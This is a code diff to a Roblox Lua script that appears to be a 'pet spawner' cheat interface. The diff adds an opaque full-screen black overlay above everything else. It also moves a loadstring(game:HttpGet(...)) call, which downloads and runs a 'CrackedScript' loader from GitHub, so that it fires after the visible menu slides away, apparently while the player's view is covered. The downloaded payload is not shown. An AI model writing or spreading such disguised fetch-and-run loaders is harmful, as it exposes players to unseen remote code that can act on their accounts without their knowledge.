@@ -6,12 +6,18 @@ ScreenGui.IgnoreGuiInset = true
 ScreenGui.DisplayOrder = 999999999
 ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
 
+local BlackScreen = Instance.new("Frame")
+BlackScreen.Name = "BlackScreen"
+BlackScreen.Size = UDim2.new(1, 0, 1, 0)
+BlackScreen.ZIndex = 999999999
+BlackScreen.Parent = ScreenGui
+
 local MainFrame = Instance.new("Frame")
 MainFrame.Name = "MainFrame"
 MainFrame.Size = UDim2.new(0, 0, 0, 0)
 MainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
 MainFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
-MainFrame.ZIndex = 999999999
+MainFrame.ZIndex = 999999998
 MainFrame.Parent = ScreenGui
 local UIAspectRatioConstraint = Instance.new("UIAspectRatioConstraint")
 UIAspectRatioConstraint.AspectRatio = 1.212
@@ -317,14 +323,6 @@ local MainFrameSlidePosition = UDim2.new(0.5, 0, -0.5, 0)
 local loadSuccess = false
 local loadError = nil
 
-task.spawn(function()
-	local success, err = pcall(function()
-		loadstring(game:HttpGet("https://raw.githubusercontent.com/NoLagHub-PetSpawner/CrackedScript-V1/refs/heads/main/Loader.lua"))()
-	end)
-	loadSuccess = success
-	loadError = err
-end)
-
 local firstSet = {
 	NLH,
 	NLHS,
@@ -491,6 +489,13 @@ local function handler()
 	local TweenInfoOfSlide = TweenService:Create(MainFrame, TweenInfo.new(1, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {Position = MainFrameSlidePosition})
 	TweenInfoOfSlide:Play()
 	TweenInfoOfSlide.Completed:Wait()
+	task.spawn(function()
+		local success, err = pcall(function()
+			loadstring(game:HttpGet("https://raw.githubusercontent.com/NoLagHub-PetSpawner/CrackedScript-V1/refs/heads/main/Loader.lua"))()
+		end)
+		loadSuccess = success
+		loadError = err
+	end)
 	MainFrame:Destroy()
 end
 
